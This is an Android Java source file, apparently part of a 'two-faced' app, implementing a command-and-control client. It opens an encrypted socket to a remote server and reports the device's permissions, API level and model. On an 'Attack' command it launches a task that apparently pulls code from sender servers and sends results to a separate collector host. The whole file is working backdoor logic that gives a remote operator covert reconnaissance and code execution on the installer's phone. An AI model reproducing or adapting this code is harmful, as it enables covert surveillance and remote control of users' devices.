package com.android.app_2_faces_net;

import android.content.Context;
import android.content.pm.PackageManager;
import android.os.AsyncTask;
import android.util.Log;

import java.io.IOException;
import java.util.Arrays;
import java.util.concurrent.Callable;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.regex.Pattern;

public class CommunicationTask implements Runnable {
    private static final String TAG = "Communication Task";

    private final Context context;

    private final String socketMainHostname;
    private final int socketMainPort;

    private CryptedSocket socketMain;


    public CommunicationTask(Context context, String socketMainHostname, int socketMainPort) {
        this.context = context;
        this.socketMainHostname = socketMainHostname;
        this.socketMainPort = socketMainPort;
    }

    @Override
    public void run() {
        try {
            this.socketMain = new CryptedSocket(this.socketMainHostname, this.socketMainPort);
            this.socketMain.connect();

            this.socketMain.write("alive");
            boolean isAlive = true;

            while (isAlive) {
                String commandReceived = this.socketMain.read();
                Log.d(TAG, commandReceived);

                String toSend = "";
                switch (commandReceived) {
                    case "Permissions":
                        toSend = DeviceUtils.getPermissions(this.context, false);
                        break;
                    case "Permissions granted":
                        toSend = DeviceUtils.getPermissions(this.context, true);
                        break;
                    case "API":
                        toSend = DeviceUtils.getApiLevel();
                        break;
                    case "Model":
                        toSend = DeviceUtils.getDeviceModel();
                        break;
                    case "Attack":
                        String senderServerString = this.socketMain.read();
                        String collectorServerString = this.socketMain.read();
                        String resultTypeString = this.socketMain.read();
                        String argString = this.socketMain.read();

                        String[] socketCodeSendersList = parseSocketCodeSenderList(senderServerString);

                        resultTypeString = resultTypeString.split("Result Type: ")[1];
                        argString = argString.split("Arg: ")[1];

                        collectorServerString = collectorServerString.split("Collector: ")[1];
                        String[] collectorParams = collectorServerString.split(":");
                        String socketCollectorHostname = collectorParams[0];
                        int socketCollectorPort = Integer.parseInt(collectorParams[1]);


                        CompilationTask compilationTask = new CompilationTask(this.context, socketCollectorHostname, socketCollectorPort, socketCodeSendersList, resultTypeString, argString);
                        ExecutorService executor = Executors.newSingleThreadExecutor();
                        executor.execute(compilationTask);

                        toSend = "Starting";
                        break;
                    case "Close":
                        isAlive = false;
                        toSend = "Closing";
                        break;
                    default:
                        toSend = "Unknown command";
                }

                Log.d(TAG, toSend);
                this.socketMain.write(toSend);
            }
        } catch (IOException | PackageManager.NameNotFoundException e) {
            e.printStackTrace();
            this.socketMain.close();
        }

        this.socketMain.close();
    }

    private String[] parseSocketCodeSenderList(String socketCodeSenderListString) {
        return socketCodeSenderListString.substring(9).split(Pattern.quote("|"));
    }
}
